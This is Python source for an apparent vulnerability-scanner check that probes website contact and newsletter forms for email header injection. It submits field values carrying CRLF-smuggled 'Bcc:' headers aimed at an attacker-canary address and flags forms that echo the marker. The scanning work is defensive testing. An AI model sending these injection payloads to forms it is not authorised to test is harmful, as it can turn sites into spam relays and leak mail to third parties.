"""
Email header injection detection on contact / subscribe / newsletter forms.

Approach:
  Discover forms with an email-like field. Submit with:
    name = "Attacker\\r\\nBcc: canary@attacker-canary"
    email = "victim@example.com\\r\\nBcc: canary@attacker-canary"
  If the server responds with a difference from baseline (or echoes the
  manipulated header), flag it.
"""
import re
import time
import urllib.parse
from .base import BaseCheck
from ..models import Finding
from ..utils import run
from ..constants import ATTACKER_CANARY


class EmailHeaderInjectionCheck(BaseCheck):
    name = "Email Header Injection"
    description = "Detect email-form fields that allow CRLF-based header injection"

    FORM_PATHS = [
        "/", "/contact", "/contact-us", "/subscribe", "/newsletter",
        "/signup", "/support", "/feedback",
    ]

    MARKER = "ehinj7x7"
    EVIL_BCC = f"evil-{MARKER}@{ATTACKER_CANARY}"

    def _fetch(self, url: str, timeout: int = 8) -> str:
        rc, body, _ = run(["curl", "-sL", "--max-time", str(timeout), url],
                           timeout=timeout + 4)
        return body if rc == 0 and body else ""

    def _submit(self, url: str, method: str, data: dict,
                timeout: int = 8) -> str:
        payload = "&".join(f"{urllib.parse.quote(k)}={urllib.parse.quote(str(v))}"
                            for k, v in data.items())
        args = ["curl", "-skL", "--max-time", str(timeout), url]
        if method.upper() == "POST":
            args += ["-X", "POST", "-d", payload,
                     "-H", "Content-Type: application/x-www-form-urlencoded"]
        rc, body, _ = run(args, timeout=timeout + 4)
        return body if rc == 0 and body else ""

    def _extract_mail_forms(self, body: str, base_url: str) -> list[dict]:
        forms = []
        for m in re.finditer(r"<form\b([^>]*)>(.*?)</form>",
                              body, re.DOTALL | re.IGNORECASE):
            inner = m.group(2)
            has_email_field = re.search(
                r'name=["\'](?:email|from|sender|contact_email|'
                r'your_email|user_email)["\']', inner, re.IGNORECASE,
            )
            if not has_email_field:
                continue
            attrs = {}
            for am in re.finditer(r'(\w+)\s*=\s*["\']([^"\']*)["\']', m.group(1)):
                attrs[am.group(1).lower()] = am.group(2)
            action = attrs.get("action", "") or base_url
            if action.startswith("/"):
                parsed = urllib.parse.urlparse(base_url)
                action = f"{parsed.scheme}://{parsed.netloc}{action}"
            inputs = []
            for im in re.finditer(r'<input\b([^>]*)>', inner, re.IGNORECASE):
                iattrs = {}
                for am in re.finditer(r'(\w+)\s*=\s*["\']([^"\']*)["\']',
                                        im.group(1)):
                    iattrs[am.group(1).lower()] = am.group(2)
                name = iattrs.get("name")
                if name:
                    inputs.append((name, iattrs.get("type", "text").lower()))
            forms.append({"action": action, "method": attrs.get("method", "post"),
                          "inputs": inputs})
        return forms

    def _test_form(self, form: dict) -> None:
        # Build baseline
        baseline_data = {name: ("victim@example.com" if "mail" in name.lower()
                                else "ok-text")
                         for name, _ in form["inputs"]}
        baseline_body = self._submit(form["action"], form["method"], baseline_data)
        if not baseline_body:
            return

        # Build injection
        inj_data = dict(baseline_data)
        for name, _itype in form["inputs"]:
            if "mail" in name.lower() or "from" in name.lower() or "sender" in name.lower():
                inj_data[name] = f"victim@example.com\r\nBcc: {self.EVIL_BCC}"
            elif "name" in name.lower() or "subject" in name.lower():
                inj_data[name] = f"test\r\nBcc: {self.EVIL_BCC}"
        inj_body = self._submit(form["action"], form["method"], inj_data)
        if not inj_body:
            return

        # Signals: evil email reflected OR server responds differently
        if self.MARKER in inj_body and self.MARKER not in baseline_body:
            self.findings.append(Finding(
                severity="high",
                title=f"Email Header Injection on form {form['action']}",
                host=form["action"],
                detail=(
                    f"Form at {form['action']} reflects the injected Bcc marker "
                    f"'{self.MARKER}'. CRLF-based mail header injection likely "
                    f"adds attacker-controlled recipients."
                ),
                source="email_header_injection",
                url=form["action"],
                tags=["email-injection", "crlf", "mail-headers"],
                evidence=self.EVIL_BCC,
            ))

    def execute(self) -> list[Finding]:
        for host in self._hosts(3):
            for path in self.FORM_PATHS:
                body = self._fetch(host + path)
                if not body:
                    continue
                for form in self._extract_mail_forms(body, host + path):
                    try:
                        self._test_form(form)
                    except Exception as exc:
                        self.log.debug(f"  email_hdr_inj: {exc}")
        return self.findings
